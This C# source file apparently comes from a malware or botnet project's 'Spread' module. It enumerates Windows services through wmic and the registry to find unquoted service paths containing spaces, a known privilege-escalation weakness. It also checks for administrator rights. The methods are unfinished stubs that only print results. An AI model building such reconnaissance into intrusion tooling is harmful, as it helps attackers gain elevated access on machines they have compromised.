using System;
using System.Security.Principal;
using Vinchuca.System;
using Vinchuca.Utils;

namespace Vinchuca.Spread
{
    class PrivilegeScalation
    {
        private static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            var isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            return isAdmin;
        }
        public static bool IsServiceInstalled()
        {
            var result = WinShell.Execute("wmic service get name,pathname");
            foreach (var line in result.Split(new[] { "\r\n"}, StringSplitOptions.RemoveEmptyEntries))
            {
                var serviceName = line.Substring(0, 41).Trim();
                var path = line.Substring(42);
                if (!path.StartsWith("\""))
                {
                    var io = path.IndexOf(".exe");
                    if (io > 0)
                    {
                        if( path.Substring(0, io).Contains(" "))
                            Console.WriteLine(path);
                    }
                }
            }
            return false;
        }

        public static bool IsServiceInstalled2()
        {
            var servicesKey = @"HKLM\SYSTEM\CurrentControlSet\Services\\";
            foreach (var serviceName in RegistryUtils.ListSubKeys(servicesKey))
            {
                var path = RegistryUtils.Read(servicesKey + "\\" + serviceName + "\\ImagePath");

                if (path.StartsWith("C:", StringComparison.InvariantCultureIgnoreCase))
                {
                    Console.WriteLine(path);
                }
            }
            return false;
        }

    }
}
